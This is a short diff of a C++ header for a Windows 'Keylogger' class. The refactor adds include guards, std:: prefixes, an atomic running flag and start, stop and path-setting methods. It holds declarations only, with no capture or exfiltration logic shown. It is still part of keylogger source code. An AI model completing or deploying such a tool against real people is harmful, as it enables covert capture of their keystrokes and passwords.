@@ -1,4 +1,6 @@
-#define _WIN32_WINNT 0x0500
+#ifndef KEYLOGGER_HPP
+#define KEYLOGGER_HPP
+
 #include <Windows.h>
 #include <string>
 #include <stdlib.h>
@@ -6,21 +8,24 @@
 #include <iostream>
 #include <fstream>
 #include <chrono>
-
-using namespace std;
+#include <atomic>
+#include <filesystem>
 
 class Keylogger {
 public:
-    Keylogger(const string& filename) : logFilename(filename) {}
+    Keylogger(const std::string& filename) : logFilename(filename), running(false) {}
 
-    void captureKey(int time);
+    void captureKey();
+    void setPath(const std::string &filePath);
+    void stop();
 
 private:
-    string logFilename;
+    std::string logFilename;
+    std::atomic<bool> running;
 
-    void log(const string& input);
-
+    void log(const std::string& input);
     bool logSpecialKey(int key);
-
-    void logKey(char key) { log(string(1, key)); }
+    void logKey(char key) { log(std::string(1, key)); }
 };
+
+#endif
